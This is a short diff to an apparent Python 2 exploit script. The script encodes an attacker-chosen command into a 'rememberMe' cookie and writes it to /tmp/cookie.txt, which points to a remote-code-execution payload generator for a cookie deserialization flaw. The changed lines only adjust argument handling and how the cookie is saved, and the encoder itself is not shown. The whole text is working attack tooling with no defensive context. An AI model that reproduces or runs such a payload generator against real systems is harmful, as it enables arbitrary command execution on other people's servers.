@@ -22,9 +22,10 @@ def encode_rememberme(command):
 if __name__ == '__main__':
     if len(sys.argv) != 2:
         print 'Usage:', sys.argv[0], 'command_to_execute'
-        return
+        sys.exit(0)
 
-    payload = encode_rememberme(sys.argv[1])    
-    with open("/tmp/payload.cookie", "w") as fpw:
-        print "rememberMe={}".format(payload.decode())
+    payload = encode_rememberme(sys.argv[1]) 
+    with open("/tmp/cookie.txt", "w") as f:
+        f.write("rememberMe={}".format(payload.decode()))
 
+    print 'Wrote /tmp/cookie.txt'
